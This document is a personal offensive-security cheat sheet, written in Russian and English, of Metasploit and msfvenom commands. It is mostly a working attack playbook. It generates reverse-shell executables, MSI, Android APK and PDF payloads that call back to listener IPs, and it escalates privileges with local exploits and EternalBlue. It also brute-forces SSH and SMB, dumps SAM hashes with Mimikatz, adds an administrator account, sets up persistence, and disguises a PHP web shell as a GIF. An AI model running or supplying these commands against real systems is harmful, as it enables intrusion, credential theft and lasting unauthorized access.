# MetaSploit

https://habr.com/ru/companies/npoechelon/articles/347702/  (описание работы)

searchsploit desctop control   поиск эксплойта для названия

# расширение incognito для работы с токенами
в метерпретер - load incognito
   list_tokens -u
   
# использование эксплйтов ядра
Kali VM

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe
7. Copy the generated file, shell.exe, to the Windows VM.

Windows VM

1. Execute shell.exe and obtain reverse shell

Detection & Exploitation

Kali VM

1. In Metasploit (msf > prompt) type: run post/multi/recon/local_exploit_suggester
2. Identify exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation
3. In Metasploit (msf > prompt) type: use exploit/windows/local/ms16_014_wmi_recv_notif
4. In Metasploit (msf > prompt) type: set SESSION [meterpreter SESSION number]
5. In Metasploit (msf > prompt) type: set LPORT 5555
6. In Metasploit (msf > prompt) type: run

# Содаем исполнимый файл для виндовс

msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe

# Создаем реверс шелл для виндовс

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 (только дописать -->     Invoke-PowerShellTcp -Reverse -IPAddress 10.18.35.17 -Port 4545)

https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/

https://www.revshells.com/

c meterpreter сессией

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe

проверено для netcat

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.35.17 LPORT=53 -f exe -o reverse.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.18.35.17 LPORT=7777 -f exe -o Zero.exe

msfvenom –platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.28 LPORT=4444 -f msi -o tmp/rev.msi



Включаем хендлер

rlwrap nc -lvnp 7777

вместо неткат для метасплойт

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set payload windows/x64/meterpreter_reverse_tcp

set PAYLOAD windows/x64/shell_reverse_tcp

Миграция в процесс

migrate -N winlogon.exe

Для АНДРОИД

msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk

Эксплоит в PDF​
Так же для фреймворка не составит труда сгенерировать PDF файл с полезной нагрузкой и аналогичным образом подключиться к нему. Давайте же приступим!

Здесь уже msfvenom нам не понадобиться, будем всё делать прямиком в метасплоите, поэтому снова его запускаем msfconsole.

Далее прописываем вот такие команды:

Код:

use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs


Здесь будет задействован эксполит, который будет встроен в PDF файл

Код:

set lhost 192.168.0.9

set lport 4444

set filename Test3.pdf


Здесь задаём имя нашему файлу


# Для брута 
use auxiliary/scanner/ssh/ssh_login

use auxiliary/scanner/smb/smb_login
set rhost
set 

# МИМИКАТЗ в метасплойт

kiwi_cmd lsadump::sam

Поиск уязвимостей ядра

(в метерпретер-сессии)

run post/multi/recon/local_exploit_suggester


# eternalblue в метасплойт

use exploit/windows/smb/ms17_010_eternalblue

   show payloads

set payload windows/x64/shell/reverse_tcp

# из шелла в метерпретер

post/multi/manage/shell_to_meterpreter

# Beб деливери 

use exploit/multi/script/web_delivery

set target 2

set payload windows/meterpreter/reverse_http

set lhost 1221321321
set lport 1231231

run

# настроить постоянное присутствие 

https://www.offsec.com/metasploit-unleashed/meterpreter-service/


# Переделка файла php в gif

echo -e "GIF89a1\n\n$(cat shell.php)" > shell.gif

